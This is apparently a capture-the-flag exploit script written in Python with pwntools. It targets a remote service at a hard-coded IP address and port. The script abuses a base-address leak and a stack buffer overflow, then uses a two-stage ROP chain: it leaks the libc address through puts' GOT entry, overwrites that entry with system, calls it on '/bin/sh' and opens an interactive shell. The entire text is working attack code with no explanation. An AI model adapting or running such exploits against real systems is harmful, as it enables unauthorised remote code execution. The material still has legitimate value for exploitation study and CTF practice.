from pwn import *


p = remote("35.198.185.193", 1341)
context.log_level='debug'
got = 0x9D3
pay = "A"*136

p.recvuntil("> ")
p.sendline("modinfo")
p.recvuntil("Base address: ")

addr = int(p.recv(14),16)
print "0x%x" % addr

puts = addr + 0x6E0
read = addr + 0x700
puts_got = puts + 0x200932 + 6
poprdi = 0x0000000000401550
poprsi_r15 = 0x000000000040154e
re_main = addr + 0x80A

pay += p64(poprdi) + p64(puts_got) + p64(puts)
pay += p64(re_main)

p.sendline('wrap')
p.recvuntil(' |> ')
p.sendline('-1')
p.recvuntil(' |> ')
p.sendline(pay)
p.recvuntil("Wow! This looks so beautiful\n")
leak = u64(p.recv(8)[0:]) - 0x570a000000000000
print "0x%x"%leak

libc = leak - 0x0000000000078460  
print "Libc : 0x%x" %libc

poprdx = libc + 0x0000000000001b96
system = libc + 0x0000000000047DC0
binsh = libc + 0x00000000001A3EE0


pay2 = "A"*136
pay2 += p64(poprdi) + p64(0)
pay2 += p64(poprsi_r15) + p64(puts_got) + p64(0)
pay2 += p64(poprdx) + p64(8)
pay2 += p64(read)

pay2 += p64(poprdi) + p64(binsh)
pay2 += p64(puts)


p.recvuntil(' |> ')
p.sendline('-1')
p.recvuntil(' |> ')
p.sendline(pay2)
p.recvuntil("Wow! This looks so beautiful\n")
p.send(p64(system))
p.interactive()
